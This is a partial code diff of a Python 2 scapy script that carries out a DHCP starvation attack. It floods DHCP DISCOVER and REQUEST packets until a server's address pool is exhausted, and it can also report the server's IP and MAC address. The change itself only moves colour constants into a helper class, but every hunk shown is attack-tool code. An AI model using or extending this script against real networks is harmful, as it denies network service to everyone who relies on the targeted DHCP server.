@@ -14,18 +14,10 @@ from scapy.all import sniff, DHCP, BOOTP, sendp
 from logging import getLogger, ERROR
 getLogger("scapy.runtime").setLevel(ERROR)
 
+Base = Base()
 Base.check_user()
 Base.check_platform()
 Base.print_banner()
-
-cINFO = '\033[1;34m'
-cERROR = '\033[1;31m'
-cSUCCESS = '\033[1;32m'
-cEND = '\033[0m'
-
-_info = cINFO + '[*]' + cEND + ' '
-_error = cERROR + '[-]' + cEND + ' '
-_success = cSUCCESS + '[+]' + cEND + ' '
 
 _dhcp_option_value = None
 _dhcp_option_code = 12
@@ -56,12 +48,12 @@ else:
 
 _current_ip_address = Base.get_netiface_ip_address(_current_network_interface)
 if _current_ip_address is None:
-    print _error + "Network interface: " + _current_network_interface + " does not have IP address!"
+    print Base.c_error + "Network interface: " + _current_network_interface + " does not have IP address!"
     exit(1)
 
 _current_mac_address = Base.get_netiface_mac_address(_current_network_interface)
 if _current_mac_address is None:
-    print _error + "Network interface: " + _current_network_interface + " does not have mac address!"
+    print Base.c_error + "Network interface: " + _current_network_interface + " does not have mac address!"
     exit(1)
 
 _start_time = time()
@@ -73,9 +65,10 @@ def send_dhcp_discover():
     eth = Ethernet_raw()
     dhcp = DHCP_raw()
 
-    print _info + "Sending discover packets..."
-    print _info + "Delay between DISCOVER packets: " + cINFO + str(args.delay) + " sec." + cEND
-    print _info + "Start sending packets: " + cINFO + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")) + cEND
+    print Base.c_info + "Sending discover packets..."
+    print Base.c_info + "Delay between DISCOVER packets: " + Base.cINFO + str(args.delay) + " sec." + Base.cEND
+    print Base.c_info + "Start sending packets: " + Base.cINFO + str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")) + \
+        Base.cEND
 
     while True:
 
@@ -96,10 +89,10 @@ def send_dhcp_discover():
 
         if int(time() - _start_time) > args.timeout:
             if _ack_received:
-                print _success + "IP address pool is exhausted: " + cSUCCESS + \
-                    str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")) + cEND
+                print Base.c_success + "IP address pool is exhausted: " + Base.cSUCCESS + \
+                    str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")) + Base.cEND
             else:
-                print _error + "DHCP Starvation failed!"
+                print Base.c_error + "DHCP Starvation failed!"
             system('kill -9 ' + str(getpid()))
 
         sleep(int(args.delay))
@@ -116,12 +109,14 @@ def send_dhcp_request(request):
 
         if request[DHCP].options[0][1] == 2:
             if args.find_dhcp:
-                print _success + "DHCP srv IP: " + cSUCCESS + siaddr + cEND
-                print _success + "DHCP srv MAC: " + cSUCCESS + Base.get_mac(_current_network_interface, siaddr) + cEND
+                print Base.c_success + "DHCP srv IP: " + Base.cSUCCESS + siaddr + Base.cEND
+                print Base.c_success + "DHCP srv MAC: " + Base.cSUCCESS + \
+                    Base.get_mac(_current_network_interface, siaddr) + Base.cEND
                 pprint(request[DHCP].options)
                 exit(0)
 
-            print _info + "OFFER from: " + cINFO + siaddr + cEND + " your client ip: " + cINFO + yiaddr + cEND
+            print Base.c_info + "OFFER from: " + Base.cINFO + siaddr + Base.cEND + " your client ip: " + \
+                Base.cINFO + yiaddr + Base.cEND
 
             try:
                 if args.not_send_hostname:
@@ -141,21 +136,23 @@ def send_dhcp_request(request):
                                                           relay_agent_ip=_current_ip_address)
                 sendp(request_packet, iface=_current_network_interface, verbose=False)
             except KeyError:
-                print _error + "Key error, this transaction id: " + hex(xid) + " not found in our array transactions!"
+                print Base.c_error + "Key error, this transaction id: " + hex(xid) + " not found in our transactions!"
             except:
-                print _error + "Unknown error!"
+                print Base.c_error + "Unknown error!"
 
         if request[DHCP].options[0][1] == 5:
             _ack_received = True
-            print _success + "ACK from:   " + cSUCCESS + siaddr + cEND + " your client ip: " + cSUCCESS + yiaddr + cEND
+            print Base.c_success + "ACK from:   " + Base.cSUCCESS + siaddr + Base.cEND + " your client ip: " + \
+                Base.cSUCCESS + yiaddr + Base.cEND
 
         if request[DHCP].options[0][1] == 6:
-            print _error + "NAK from:   " + cERROR + siaddr + cEND + " your client ip: " + cERROR + yiaddr + cEND
+            print Base.c_error + "NAK from:   " + Base.cERROR + siaddr + Base.cEND + " your client ip: " + \
+                Base.cERROR + yiaddr + Base.cEND
 
 
 if __name__ == "__main__":
     tm = ThreadManager(2)
     tm.add_task(send_dhcp_discover)
-    print _info + "Sniffing interface: " + str(_current_network_interface)
+    print Base.c_info + "Sniffing interface: " + str(_current_network_interface)
     sniff(filter="udp and src port 67 and dst port 67 and dst host " + _current_ip_address,
           prn=send_dhcp_request, iface=_current_network_interface)
